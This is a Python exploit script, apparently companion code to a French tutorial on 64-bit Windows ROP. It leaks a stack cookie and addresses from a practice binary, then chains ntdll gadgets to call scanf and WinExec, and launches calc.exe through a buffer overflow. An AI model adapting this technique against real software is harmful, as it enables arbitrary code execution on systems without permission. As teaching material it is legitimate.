# https://www.dailysecurity.fr/windows_exploit_64_bits_rop/

from pwintools import *

p = Process("exemple_rop.exe")
# p.spawndebugger(breakin=False)

p.recvuntil(":")
p.sendline(str(500))
p.recvuntil(":")
p.sendline("a"*60)
leak=p.recvuntil(":")[65:]

ntdll_base=p.libs()['ntdll.dll']
kernel32_base=p.libs()['kernel32.dll']
ret_addr=u64(leak[0x18:0x20])
base_addr=ret_addr - 0x36c # offset address after call main
cookie=u64(leak[:8])

poprcx=ntdll_base + 0x11fe9
poprdx=ntdll_base + 0x12991
retgadget=ntdll_base + 0x7cbe2
pop4ret=ntdll_base + 0x14caf
s_addr=base_addr + 0x126c
winexec_addr=kernel32_base + 0xdf840
winexec_addr=kernel32_base + 0xdf840
data_addr=base_addr + 0x2600
scanf_addr=base_addr + 0x10


print("[+] chall.exe base address : 0x%x"     % base_addr)
print("[+] ntdll.dll base address : 0x%x"     % ntdll_base)
print("[+] kernel32.dll base address : 0x%x"  % kernel32_base)
print("[+] cookie value : 0x%x"               % cookie)
print("[+] Winexec address : 0x%x"            % winexec_addr)
print("[+] scanf address : 0x%x"              % scanf_addr)
print("[+] ret address : 0x%x"                % ret_addr)

print("[+] Build ropchain")

ropchain="a"*64 + p64(cookie) + "b"*16
#scanf("%s",data_addr);
ropchain+=p64(poprcx) + p64(s_addr) # Pop 1st arg
ropchain+=p64(poprdx) + p64(data_addr) # Pop 2nd arg 
ropchain+=p64(retgadget)+p64(scanf_addr) + p64(pop4ret) # Align rsp using ret + call scanf + set return addr to pop4ret to jump over the shadow space
ropchain+="b"*0x20 # Padding to return address (shadow space size)
#WinExec(data_addr,1);
ropchain+=p64(poprcx) + p64(data_addr) # Pop 1st arg
ropchain+=p64(poprdx) + p64(1) # Pop 2nd arg
ropchain+=p64(winexec_addr) #  call WinExec
ropchain+=p64(ret_addr) # Set return address to the real main return value
print("[+] Trigger overflow...")
p.sendline(str(600))
p.sendline(ropchain)
p.sendline('calc.exe\x00') # for the scanf inside the ropchain
print("[+] Gimme that calc")